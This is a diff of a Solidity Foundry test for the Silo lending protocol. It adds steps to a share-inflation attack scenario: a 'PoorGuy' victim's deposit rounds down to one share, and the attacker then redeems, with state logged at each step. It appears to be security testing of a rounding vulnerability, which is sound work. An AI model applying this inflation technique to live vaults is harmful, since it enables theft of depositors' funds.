@@ -91,6 +91,47 @@ contract DepositTest is SiloLittleHelper, Test {
         console.log("*** After +40 (log2(10^18) < 60) steps of deposit silo0.getCollateralAssets() -> withdraw 1 wei ***");
         console.log("collateralShareToken.totalSupply(): ", IShareToken(collateral.collateralShareToken).totalSupply());
         console.log("silo0.getCollateralAssets(): ", silo0.getCollateralAssets());
+        
+        _poorGuyDeposit();
+
+        // _makeDeposit(silo0, token0, silo0.getCollateralAssets() * 100, depositor, ISilo.CollateralType.Collateral);
+        // depositedForAttack += silo0.getCollateralAssets() * 100;
+        // console.log("*** Prepare shares for a redeem ***");
+        // console.log("collateralShareToken.totalSupply(): ", IShareToken(collateral.collateralShareToken).totalSupply());
+        // console.log("silo0.getCollateralAssets(): ", silo0.getCollateralAssets());
+        // console.log("silo0.maxRedeem(depositor): ", silo0.maxRedeem(depositor));
+
+
+        uint256 beforeReedem = token0.balanceOf(depositor);
+        uint256 toRedeem = silo0.maxRedeem(depositor);
+        vm.prank(depositor);
+        silo0.redeem(toRedeem, depositor, depositor);
+
+        console.log("*** After redeem ***");
+        console.log("collateralShareToken.totalSupply(): ", IShareToken(collateral.collateralShareToken).totalSupply());
+        console.log("silo0.getCollateralAssets(): ", silo0.getCollateralAssets());
+        console.log("silo0.maxRedeem(depositor): ", silo0.maxRedeem(depositor));
+
+        // assertEq(depositedForAttack, token0.balanceOf(depositor) - beforeReedem);
+    }
+
+    function _poorGuyDeposit() internal {
+        ISiloConfig.ConfigData memory collateral = silo0.config().getConfig(address(silo0));
+
+        address poorGuy = makeAddr("PoorGuy");
+        // silo0.getCollateralAssets() + 1 will make it equal to 2 shares instead of 1 share. The value of almost 1 share is rounded down. 
+        uint256 poorGuyDepositAmount = silo0.getCollateralAssets();
+        _makeDeposit(silo0, token0, poorGuyDepositAmount, poorGuy, ISilo.CollateralType.Collateral);
+        console.log("*** Poor guy deposited silo0.getCollateralAssets() -> got 1 share for it. Deposit rounded down ***");
+        console.log("collateralShareToken.totalSupply(): ", IShareToken(collateral.collateralShareToken).totalSupply());
+        console.log("silo0.getCollateralAssets(): ", silo0.getCollateralAssets());
+
+        // uint256 poorGuyBalanceBeforeRedeem = token0.balanceOf(poorGuy);
+        // vm.prank(poorGuy);
+        // silo0.redeem(1, poorGuy, poorGuy);
+
+        // // 0.66666666666
+        // assertEq(token0.balanceOf(poorGuy) - poorGuyBalanceBeforeRedeem, poorGuyDepositAmount);
     }
 
     function _prepareForTheAttack(address _depositor, address _borrower) internal {
